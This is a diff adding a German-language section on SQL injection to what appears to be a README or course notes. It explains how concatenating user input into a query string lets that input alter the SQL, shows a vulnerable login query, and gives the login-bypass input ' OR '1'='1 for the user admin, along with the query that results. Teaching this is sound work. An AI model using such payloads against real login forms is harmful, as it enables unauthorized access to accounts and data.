@@ -43,3 +43,37 @@ Bitte beachten, dass dieses Script nicht in BASH, sondern in ASH geschrieben ist
 
 
 ## SQL injection
+
+### Erklärung
+
+Bei einem Eingabefeld, welches anfällig für SQL-Injection ist, wird normalerweise der Inhalt vom Feld in einer Variable gespeichert. Diese Variable wird dann direkt in den String, welcher die Query enthaltet verkettet (concatenate). Deshalb kann man mit ein wenig Geschick eine Eingabe machen, welche Teile eines SQL Befehls beinhaltet.
+
+Das eingegebene wird so mit in die Query genommen und von der Datenbank ausgeführt. So kann man Abfrageresultate oder sogar den Datenbestand manipulieren.
+
+```sql
+SELECT username, password FROM users
+WHERE username = '[Eingabe Nutzername]'
+HAVING password = '[Eingabe Passwort]';
+```
+
+### Eingaben
+
+Username:
+
+```
+admin
+```
+
+Password:
+
+```
+' OR '1'='1
+```
+
+Lösungsquery, welche im Hintergrund dann ausgeführt wird:
+
+```sql
+SELECT username, password FROM users
+WHERE username = 'admin'
+HAVING password = '' OR '1'='1';
+```
